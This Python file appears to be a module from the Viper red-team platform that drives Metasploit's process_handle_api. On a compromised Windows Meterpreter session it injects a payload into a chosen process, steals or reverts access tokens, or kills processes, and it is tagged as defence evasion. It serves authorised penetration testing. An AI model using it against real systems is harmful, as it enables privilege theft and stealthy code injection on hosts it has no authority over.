# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "进程操作"
    DESC_ZH = "根据PID操作进程,包括注入/关闭,窃取token,还原token."

    NAME_EN = "Process operation"
    DESC_EN = "According to the PID operation process, including injecting/closing, stealing tokens, and restoring tokens."

    MODULETYPE = TAG2TYPE.Defense_Evasion
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM"]  # 所需权限
    ATTCK = ["T1055"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/msfxfl"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1050/"]
    AUTHOR = "Viper"

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionHander(required=False),
        OptionInt(name='PID',
                  tag_zh="PID", desc_zh="进程PID",
                  tag_en="PID", desc_en="Process PID",
                  required=True),
        OptionEnum(name='ACTION',
                   tag_zh="操作", desc_zh="选择针对进程的操作",
                   tag_en="Action", desc_en="Select the action for the process",
                   required=True,
                   default="inject",
                   length=18,
                   enum_list=[
                       {'tag_zh': '窃取token(steal_token)', 'tag_en': 'steal_token', 'value': "steal_token"},
                       {'tag_zh': '还原token(rev2self)', 'tag_en': 'rev2self', 'value': "rev2self"},
                       {'tag_zh': '注入(inject)', 'tag_en': 'inject', 'value': "inject"},
                       {'tag_zh': '关闭(kill)', 'tag_en': 'kill', 'value': "kill"},
                   ]),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "windows/manage/process_handle_api"

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        if not session.is_windows:
            return False, "此模块只支持Windows的Meterpreter"

        if self.param("ACTION") in ["inject"]:
            self.type = "exploit"
            self.mname = "windows/local/process_handle_api"
            flag = self.set_payload_by_handler()
            if flag is not True:
                return False, "Handler解析失败,请重新选择Handler参数"

        self.set_msf_option(key='PID', value=self.param("PID"))
        self.set_msf_option(key='ACTION', value=self.param("ACTION"))

        return True, None

    def callback(self, status, message, data):
        if status is not True:
            self.log_error("模块执行失败,失败原因:{}".format(message))
        else:
            self.log_good("模块执行成功")
            if self.param("ACTION") in ['steal_token', "rev2self"]:
                self.log_good("当前用户: {}".format(data.get("user")))
            self.log_good("进程PID: {}".format(data.get("pid")))
